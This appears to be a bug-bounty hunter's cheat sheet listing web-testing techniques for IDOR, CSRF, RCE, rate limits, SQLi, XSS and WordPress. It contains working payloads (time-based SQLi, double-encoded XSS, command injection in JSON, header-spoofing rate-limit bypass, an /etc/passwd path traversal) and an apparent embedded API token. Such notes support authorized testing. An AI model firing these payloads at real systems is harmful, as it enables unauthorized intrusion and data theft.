<details>
	<summary>IDOR</summary>
	
    1- Look for id everywhere
    
    2- Play with hash/encoded values
    
    3- Change The ID's in the request 
    
    4- Upload the profile photo for another user
    
    5- Try change/View data of another user
    
    6- Do something with your email then change it in Burp

    7- Add parameter IDs to requests that don’t have them 

    8- Try replacing parameter names

    9- Try changing the requested file type 
    	GET /user_data/2341 --> 401 Unauthorized
	GET /user_data/2341.json --> 200 OK
    
    10- Try using an array {“id”:19} → {“id”:[19]}

    11- Wildcard ID /api/users/*

    12- check for session cookies if has httponly flag

    13- use the inspector of Burp Repeater to play with id's

    14- use https://jwt.io

    15- create two accounts and save both jwt data and try change between them

    16- detect each cookie and see where it being used

    17- Gather POST & GET and test every CRUD

    18- 

 
  
</details>

-----------------------------------------------------------------------------

<details>
	<summary>Broken Access Control</summary>

	1- Test some Graphql operations with different user roles and see what this operation do
 	2- Check the role of every user and try upgrade your role by urself
  	3- try any unauth behavior like :
   		- member delete admin
     		- member send invites using the invite request
       		- member outside the comapny try any action 
	 	- 
 
</details>

-----------------------------------------------------------------------------

<details>
	<summary>CSRF</summary>

	Generate POC using LazyCSRF in BurpSuite
	=================================================
	FIRST SCENARIO: 
  	1- Login as Attacker and intercept any function like change email, pass, logout...etc
   	2- Genereate CSRF poc with that reqeust
    	3- login as Victim in another browser
     	4- open the CSRF poc in victim browser if did the function then it's a bug
  	
   	=================================================
	SECOND SCENARIO: The Token is tied to non-session cookie
 		if the token tied to an attribute in the request 
 	1- intercept the request of user1 change email,username..etc
  	2- Genrate POC 
   	3- get the CSRF key and attribute value of user2
    	4- 

    	=================================================
   	- Remove the token and leave the parameter empty
  	- Try use another user CSRF token
   	- Change the request method to get and remove the token
    	- Add Ayhaga to the real CSRF token 
     	- Dynamic chars in CSRF token manipulate
	- try delete referrer
 	- Referrer: https://target.com/https://evil.com
  	

 
</details>

-----------------------------------------------------------------------------

<details>
	<summary>Logic Bugs</summary>
	
    1- Try change the price or quantity of item
    
    2- Multiple booking for one room
    
    3- Place order without verify stock level
    
    4- Use coupons or bounus more than one time
    
    5- Check the difference bettween Front-end & Burp request
    
    6- Try creating more than one from the same block 

    7- Check for all posible IF statements and try to bypass it

    8- A user gains access to restricted features they shouldn't have access to.

    9- Try access files after deletion using the link of this file 

    10- Make changes in the source code disabled -> enabled / hidden -> flex

    11- Delete comment with report https://shahjerry33.medium.com/business-logic-errors-a-new-look-3b18d9c2a12f

    12- 
      
		
</details>

-----------------------------------------------------------------------------

<details>
	<summary>RCE</summary>

	1- Injection in json file 
 		{
   		   "username":" `touch ayfile.txt` ",
		   "password":"test"
		}
  	We establish a connection using ntcat then inject command in the json to get this connection
     --------------------------------------------------------------------------------------------------
     2- 

     
</details>

-----------------------------------------------------------------------------

<details>
	<summary>Race Condition</summary>

    1- 
 
</details>

-----------------------------------------------------------------------------

<details>
	<summary>Rate Limit</summary>

 	rate limit 
	1- no rate limit on login page 
	2- no rate limit on internal password
	3- no rate limit on sending reset password link 
	4- no rate limit on OTP or 2FA => account takeover
	5- no rate limit on contact us page 
	6- no rate limit on comments 
	7- no rate limit on reports of comments
	8- no rate limit on port 22
 	9- no rate limit on create users account lead to massive accounts created
	
	------------
	bypass rate limit by adding headers 
	X-Forwarded-For: 127.0.0.1
	X-Forwarded-Host: 127.0.0.1
	X-Origination-IP: 127.0.0.1 or 0.0.0.0
	X-Fowarded-For: 127.0.0.1
	X-Remote-IP: 127.0.0.1
	X-Remote-Addr: 127.0.0.1
	------------------------------------------
	POST /login.php HTTP/1.1
	Host: target.com
	X-Forwarded-For: 127.0.0.1
	X-Forwarded-Host: 127.0.0.1
	X-Origination-IP: 127.0.0.1 or 0.0.0.0
	X-Fowarded-For: 127.0.0.1
	X-Remote-IP: 127.0.0.1
	X-Remote-Addr: 127.0.0.1
	
	username=admin&password=$fuzz$
	-------------------------------------------
	429 => 403 
	bypass rate limit 
	
	ffuf -u https://example.com -w wordlist.txt --data "username=admin&password=FUZZ"  -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1"`
	
	403 


</details>

-----------------------------------------------------------------------------


<details>
## <summary>check sql injection in php</summary>
    
    1- first let's gather parameters 
    # arjun -i php.txt | tee -a parameters.txt
    2- after knowing parameters like id then full url would be 
    https://example.com/file.php?id=*
    3- use sqlmap 
    # sqlmap -u "~~https://example.com/file.php?id=*~~" --dbs --banner --batch --random-agent
    
 </details>   


-----------------------------------------------------------------------------


    
<details>
## <summary>SQLI</summary>

    id = 1'XOR(if(now()=sysdate(),sleep(2*2),0))OR'

	username:’ — ‘/” — “
	password:’ — ‘/” — “
</details>


-----------------------------------------------------------------------------

<details>
	<summary>XSS</summary>

 
	
	dalfox url "https://target.com/?q=search" -o dalfox_xss.txt
	dalfox file allParam.txt --waf-evasion --user-agent 'Mozilla/5.0 (x11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 			Safari/537.36' --proxy 'http://127.0.0.1:8080' --timeout 30 -b 'payload from xss.report' -o xssProbability.txt --deep-domxss 

	
	echo "domain.com" | gau | kxss | grep ">"
	
	paramspider --domain domain.com
	paramspider --domain https://www.domain.com --exclude woff,css,png,svg,jpg --output t.txt
	
	echo "sub.domain.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | sort -u | dalfox pipe
	
	
	cat domain.txt | kxss | grep "\" ' < >" | tee kxss.txt
	
	cat domain.txt | kxss


	Double Decode :
 		%2527%2520onmouseover%253D%2527alert%25281%2529%2527%2520
   		%2527%2520onfocus%253D%2527alert%25281%2529%2527%2520autofocus%253D%2527
     		%2527%2520onfocus%253D%2527alert%25281%2529%2527%2520
       		%2527%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E
   		
    
</details>



------------------------------------------------------------------------------------------------------

<details>
## <summary>hacking WordPress</summary>
    
    
    wpscan --url [https://target.com](https://target.com/) --disable-tls-checks --api-token zBsi404GGCMKGzTraiEsSsQsFXCsUVWmaDUsn3EPuKc -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
    wordpress usernames exposure :
    /wp-json/wp/v2/users
    /author-sitemap.xml
    /wp-content/debug.log
    /wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
    	
    /wp-login.php?action=register
    /wp-json/?rest_route=/wp/v2/users/
    /wp-json/?rest_route=/wp/v2/users/n

</details>

-----------------------------------------------------------------------------


<details>
## <summary>Javascript Analysis</summary>
    
    1- use mantra to get api , passwords , keys ...
     cat js.txt | mantra  | tee -a mantra.txt
    2- use nuclei to search for secrets 
     nuclei -l js.txt -t nuclei-templates/http/exposures/ -o nucleijs.txt
    
    if found google api key then use tool google.sh  and see if api valid or not
    google.sh AIz.............

	
 	- wayback
	- gospider
	- katana
	=> allurls.txt
	
	1- Use Mantra => for api keys
	
	2- Use jsluice => for secrets and urls =>  jsluice urls player.js
						     jsluice secrets player.js
	 for i in $(ls);do jsluice secrets $i;done
	
	3- Use nuclei  => nuclei-tempates/http/exposures/
	 nuclei -l js.txt -t /root/nuclei-templates/http/exposures/ -mhe 4
	4- analyze the code with js beaty in visual studio code 


</details>

-----------------------------------------------------------------------------


<details>
	<summary>PHP</summary>
</details>



-----------------------------------------------------------------------------





-----------------------------------------------------------------------------

